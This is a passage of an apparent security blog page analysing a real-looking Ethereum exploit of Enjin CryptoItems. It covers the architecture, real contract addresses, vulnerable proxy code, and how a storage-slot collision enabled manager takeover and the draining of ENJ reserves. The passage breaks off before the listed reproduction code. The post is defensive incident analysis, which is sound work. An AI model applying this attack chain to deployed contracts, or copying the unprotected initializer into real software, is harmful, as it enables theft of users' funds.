@@ -1,0 +1,1042 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy - YINHUI&#39;s BLOG</title><meta name="author" content="yinhui">
+<meta name="description" content="Analysis of the Enjin CryptoItems exploit on Ethereum, where a storage-slot collision in an unverified delegatecall proxy allowed permissionless manager takeover and drained 5.2M ENJ."><meta name="keywords" content='attack'>
+  <meta itemprop="name" content="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy">
+  <meta itemprop="description" content="Analysis of the Enjin CryptoItems exploit on Ethereum, where a storage-slot collision in an unverified delegatecall proxy allowed permissionless manager takeover and drained 5.2M ENJ.">
+  <meta itemprop="datePublished" content="2026-09-02T07:11:00+08:00">
+  <meta itemprop="dateModified" content="2026-09-02T07:11:00+08:00">
+  <meta itemprop="wordCount" content="2390">
+  <meta itemprop="image" content="https://yinhui1984.github.io/images/avatar.png">
+  <meta itemprop="keywords" content="Attack"><meta property="og:url" content="https://yinhui1984.github.io/enjin-cryptoitems-attack-analysis/">
+  <meta property="og:site_name" content="YINHUI&#39;s BLOG">
+  <meta property="og:title" content="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy">
+  <meta property="og:description" content="Analysis of the Enjin CryptoItems exploit on Ethereum, where a storage-slot collision in an unverified delegatecall proxy allowed permissionless manager takeover and drained 5.2M ENJ.">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-09-02T07:11:00+08:00">
+    <meta property="article:modified_time" content="2026-09-02T07:11:00+08:00">
+    <meta property="article:tag" content="Attack">
+    <meta property="og:image" content="https://yinhui1984.github.io/images/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://yinhui1984.github.io/images/avatar.png">
+  <meta name="twitter:title" content="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy">
+  <meta name="twitter:description" content="Analysis of the Enjin CryptoItems exploit on Ethereum, where a storage-slot collision in an unverified delegatecall proxy allowed permissionless manager takeover and drained 5.2M ENJ.">
+<meta name="application-name" content="YINHUI&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" data-light="#ffffff" data-dark="#ffffff" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://yinhui1984.github.io/enjin-cryptoitems-attack-analysis/" title="Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy - YINHUI&#39;s BLOG" /><link rel="prev" type="text/html" href="https://yinhui1984.github.io/when-a-uniswap-v3-vault-prices-its-own-shares-at-the-edge-of-its-range/" title="When a Uniswap V3 Vault Prices Its Own Shares at the Edge of Its Range" /><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/yinhui1984.github.io\/enjin-cryptoitems-attack-analysis\/"
+    },"image": ["https:\/\/yinhui1984.github.io\/images\/avatar.png"],"genre": "posts","keywords": "attack","wordcount":  2390 ,
+    "url": "https:\/\/yinhui1984.github.io\/enjin-cryptoitems-attack-analysis\/","datePublished": "2026-09-02T07:11:00+08:00","dateModified": "2026-09-02T07:11:00+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "yinhui"
+      },"description": "Analysis of the Enjin CryptoItems exploit on Ethereum, where a storage-slot collision in an unverified delegatecall proxy allowed permissionless manager takeover and drained 5.2M ENJ."
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="fixed" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/">首页</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="切换主题" title="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item"><a class="menu-link" href="/">首页</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      yinhui</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/security/" class="post-category" title="分类 - Security"><i class="fa-regular fa-folder" aria-hidden="true"></i> Security</a></span></div><div class="post-meta-line"><span title="发布于 2026-09-02 07:11:00"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2026-09-02">2026-09-02</time></span>&nbsp;<span title="2390 字"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>约 2400 字</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>预计阅读 12 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-system-overview--architecture">1. System Overview &amp; Architecture</a></li>
+    <li><a href="#2-the-vulnerability-storage-slot-collision-in-managed-proxy">2. The Vulnerability: Storage-Slot Collision in Managed Proxy</a></li>
+    <li><a href="#3-from-takeover-to-loot-route-poisoning--gateway-abuse">3. From Takeover to Loot: Route Poisoning &amp; Gateway Abuse</a>
+      <ul>
+        <li><a href="#step-1-route-poisoning-via-updatecontract">Step 1: Route Poisoning via <code>updateContract</code></a></li>
+        <li><a href="#step-2-deploying-a-per-item-adapter-shell">Step 2: Deploying a Per-Item Adapter Shell</a></li>
+        <li><a href="#step-3-re-entering-the-transfer-gateway-as-the-shell">Step 3: Re-entering the Transfer Gateway as the Shell</a></li>
+        <li><a href="#step-4-melting-the-stolen-nft-for-enj">Step 4: Melting the Stolen NFT for ENJ</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-the-real-incident-6-targets-and-523m-enj">4. The Real Incident: 6 Targets and 5.23M ENJ</a></li>
+    <li><a href="#5-reproduction">5. Reproduction</a>
+      <ul>
+        <li><a href="#maliciousshelllogicsol"><code>MaliciousShellLogic.sol</code></a></li>
+        <li><a href="#enjinnfthackpoctsol"><code>EnjinNftHackPoC.t.sol</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#6-key-takeaways">6. Key Takeaways</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>On Ethereum mainnet at block 25834070, transaction <code>0xd4a382da03c99ce3084661b913b50b525a4b283f66f510bcf1040152830b2a7e</code> drained 5,238,353 ENJ (over 53% of the reserve in the Adapter contract) from Enjin&rsquo;s CryptoItems ecosystem. The attacker netted 5,231,353 ENJ while an unintended 7,000 ENJ was routed to a legitimate creator through the protocol&rsquo;s built-in royalty fee logic.</p>
+<p>The vulnerability stems from a storage-slot collision between a &ldquo;Managed&rdquo; delegatecall proxy template and an independent logic contract routed to by that proxy. Calling an unauthenticated <code>initialize()</code> function on the proxy overwrote its pending-manager storage slot, turning a routine backend registration into an immediate, permissionless manager takeover. Once in control, the attacker poisoned the proxy&rsquo;s routing table, deployed per-item adapter shells, hijacked the transfer gateway to reassign high-value items from real holders, and melted them into ENJ backing reserves.</p>
+<h2 class="heading-element" id="1-system-overview--architecture"><span>1. System Overview &amp; Architecture</span>
+  <a href="#1-system-overview--architecture" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Enjin&rsquo;s CryptoItems platform is an ERC-1155 item economy backed by ENJ. Users can create item categories, mint instances (fungible or non-fungible), trade them, and &ldquo;melt&rdquo; them to redeem their underlying ENJ backing.</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                      +-----------------------------------+
+</span></span><span class="line"><span class="cl">                      |      Platform Adapter (PA)        |
+</span></span><span class="line"><span class="cl">                      |  0xfaaFDc07907ff5120a76b34b731...  |
+</span></span><span class="line"><span class="cl">                      +-----------------+-----------------+
+</span></span><span class="line"><span class="cl">                                        | delegatecall
+</span></span><span class="line"><span class="cl">                                        v
+</span></span><span class="line"><span class="cl">     +---------------------------------------------------------------------+
+</span></span><span class="line"><span class="cl">     |                     CryptoItems Facet Modules                       |
+</span></span><span class="line"><span class="cl">     |                                                                     |
+</span></span><span class="line"><span class="cl">     |  +-----------------------------+   +-----------------------------+  |
+</span></span><span class="line"><span class="cl">     |  |    CryptoItemsAdapters      |   |      CryptoItemsUsers       |  |
+</span></span><span class="line"><span class="cl">     |  | (0x68ee930ea6ad962205f1...) |   | (0x1b73f45892d528379397...) |  |
+</span></span><span class="line"><span class="cl">     |  | - 0x33d332ab (deploy shell) |   | - melt()                    |  |
+</span></span><span class="line"><span class="cl">     |  | - 0x41c1df0e (NFT gateway)  |   +-----------------------------+  |
+</span></span><span class="line"><span class="cl">     |  +-----------------------------+                                    |
+</span></span><span class="line"><span class="cl">     +----------------------------------+----------------------------------+
+</span></span><span class="line"><span class="cl">                                        | staticcall / external call
+</span></span><span class="line"><span class="cl">                                        v
+</span></span><span class="line"><span class="cl">                      +-----------------------------------+
+</span></span><span class="line"><span class="cl">                      |      Adapter / EternalStorage     |
+</span></span><span class="line"><span class="cl">                      |  0x4E643a25a64952895f553f20252...  |
+</span></span><span class="line"><span class="cl">                      |  - Holds 9.85M ENJ reserve        |
+</span></span><span class="line"><span class="cl">                      |  - Item ledger &amp; owner mappings   |
+</span></span><span class="line"><span class="cl">                      |  - Only approved caller: PA       |
+</span></span><span class="line"><span class="cl">                      +-----------------------------------+</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>The system relies on several core contracts:</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>Contract</th>
+            <th>Address</th>
+            <th>Role</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><strong>Adapter (EternalStorage)</strong></td>
+            <td><code>0x4E643a25a64952895f553f20252861258727174e</code></td>
+            <td>Holds the item ledger (<code>mapping_28</code> for NFT owners) and the backing reserve (9,852,235.68 ENJ before the attack).</td>
+        </tr>
+        <tr>
+            <td><strong>Platform Adapter (PA)</strong></td>
+            <td><code>0xfaaFDc07907ff5120a76b34b731b278c38d6043C</code></td>
+            <td>Central entry point and the <em>only</em> approved address allowed to release ENJ from Adapter. Routes calls via <code>delegatecall</code> to 9 downstream business facets.</td>
+        </tr>
+        <tr>
+            <td><strong>NFT Proxy Template (<code>NF_TEMPLATE</code>)</strong></td>
+            <td><code>0x13fA4b9a6C2F2604C919f96F456e3b50E968b157</code></td>
+            <td>&ldquo;Managed&rdquo; 2-step handover proxy used as the implementation template for per-item NFT adapter shells.</td>
+        </tr>
+        <tr>
+            <td><strong>FT Proxy Template (<code>proxy</code>)</strong></td>
+            <td><code>0x268c039a3127d3107c014f0dc6c390a53e6db27f</code></td>
+            <td>Symmetrical FT proxy template with the exact same Managed layout.</td>
+        </tr>
+        <tr>
+            <td><strong>NFT Wrapper Implementation</strong></td>
+            <td><code>0x24591e792A404e5BD48AC0F694339D807b02CfD2</code></td>
+            <td>Routed to by <code>NF_TEMPLATE</code> for ERC-721 adapter logic and <code>initialize(uint256)</code>.</td>
+        </tr>
+        <tr>
+            <td><strong>Function Router Manager</strong></td>
+            <td><code>0x04866013862349a6A19A04C8a1590ea2cF026134</code></td>
+            <td>Routed to by templates for <code>updateContract(address,string,string)</code> to modify the <code>_delegates</code> routing table.</td>
+        </tr>
+        <tr>
+            <td><strong>CryptoItemsAdapters</strong></td>
+            <td><code>0x68ee930ea6ad962205f1e29ae79bcc3dfa07c837</code></td>
+            <td>Factory module for per-item shells (<code>0x33d332ab</code>) and privileged transfer gateway (<code>0x41c1df0e</code> for NFTs, <code>0xf95d7da3</code> for FTs).</td>
+        </tr>
+        <tr>
+            <td><strong>CryptoItemsUsers</strong></td>
+            <td><code>0x1b73f45892d528379397922e8bf160b8710ee997</code></td>
+            <td>Handles user operations, including <code>melt(uint256[],uint256[])</code> to burn items and withdraw ENJ.</td>
+        </tr>
+        <tr>
+            <td><strong>ENJ Token</strong></td>
+            <td><code>0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c</code></td>
+            <td>Standard ERC20 token held in Adapter&rsquo;s reserves.</td>
+        </tr>
+    </tbody>
+  </table>
+</div><h2 class="heading-element" id="2-the-vulnerability-storage-slot-collision-in-managed-proxy"><span>2. The Vulnerability: Storage-Slot Collision in Managed Proxy</span>
+  <a href="#2-the-vulnerability-storage-slot-collision-in-managed-proxy" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Both <code>NF_TEMPLATE</code> and <code>proxy</code> implement a 2-step manager transfer pattern called <code>Managed</code>:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ManagedProxy</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="n">_getManager</span><span class="p">;</span>                  <span class="c1">// slot 0
+</span></span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="n">_acceptManager</span><span class="p">;</span>               <span class="c1">// slot 1
+</span></span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes4</span> <span class="o">=&gt;</span> <span class="kt">address</span><span class="p">)</span> <span class="k">public</span> <span class="n">delegates</span><span class="p">;</span>  <span class="c1">// slot 2
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">ManagerUpdate</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span> <span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">acceptManager</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">_acceptManager</span><span class="p">,</span> <span class="s">&#34;Managed: Sender must be the new manager&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">ManagerUpdate</span><span class="p">(</span><span class="n">_getManager</span><span class="p">,</span> <span class="n">_acceptManager</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_getManager</span> <span class="o">=</span> <span class="n">_acceptManager</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_acceptManager</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferManager</span><span class="p">(</span><span class="kt">address</span> <span class="n">_manager</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">_getManager</span><span class="p">,</span> <span class="s">&#34;Managed: only manager&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_getManager</span> <span class="o">!=</span> <span class="n">_manager</span><span class="p">,</span> <span class="s">&#34;Managed: New manager needs to be different&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_acceptManager</span> <span class="o">=</span> <span class="n">_manager</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">delegate</span> <span class="o">=</span> <span class="n">delegates</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="n">sig</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">delegate</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;Function does not exist.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// delegatecall into delegate
+</span></span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>In <code>NF_TEMPLATE</code>, selector <code>0xfe4b84df</code> (<code>initialize(uint256)</code>) is routed to <code>0x24591e792A404e5BD48AC0F694339D807b02CfD2</code> (the NFT wrapper implementation).</p>
+<p>Looking at the decompiled implementation of <code>0x24591e79</code>:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ERC721Adapter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Storage layout in the logic contract:
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// uint256 _ownerOf;                       // STORAGE[0x1] (bytes 0 to 19)
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// uint256 _totalSupply;                   // STORAGE[0x2]
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// mapping(uint256 =&gt; address) _getApproved; // STORAGE[0x3]
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">initialize</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_poolId</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_totalSupply</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;ERCAdapter: Adapter already initialized&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_poolId</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;ERCAdapter: _id is 0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">_totalSupply</span> <span class="o">=</span> <span class="n">_poolId</span><span class="p">;</span>
